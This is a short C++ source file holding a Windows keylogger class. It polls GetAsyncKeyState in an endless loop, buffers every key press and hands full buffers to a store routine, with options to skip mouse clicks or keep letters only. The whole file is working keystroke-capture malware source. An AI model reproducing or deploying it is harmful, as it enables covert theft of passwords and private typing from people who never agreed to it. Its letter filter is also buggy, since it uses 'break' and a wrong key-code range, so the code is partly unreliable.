#include "./keylogger.hpp"

using namespace chrono;

keylogger::keylogger() : m_buffer(), m_buffer_size(0), m_no_click(false), m_alphabet_only(false), m_store_character(false)
{
}

keylogger::~keylogger()
{
}


void keylogger::start()
{
	while(true)
		for (int key = 1; key < 255; key++)
			if (GetAsyncKeyState(key) == -32767)
			{
				if(m_no_click == true && (key == 1 || key == 2))
				{

				}
				else
				{
					if(m_alphabet_only == true && (key < 65 || key > 122))
						break;

					m_buffer.push_back(key);

					if(m_buffer.length() == m_buffer_size)
					{
						store();

						m_buffer.clear();
					}
				}
			}
}

void keylogger::set_buffer_size(size_t p_new_buffer_size)
{
	m_buffer_size = p_new_buffer_size;
}

void keylogger::set_no_click(bool p_no_click)
{
	m_no_click = p_no_click;
}

void keylogger::set_alphabet_only(bool p_alphabet_only)
{
	m_alphabet_only = p_alphabet_only;
}

void keylogger::set_store_character(bool p_store_character)
{
	m_store_character = p_store_character;
}
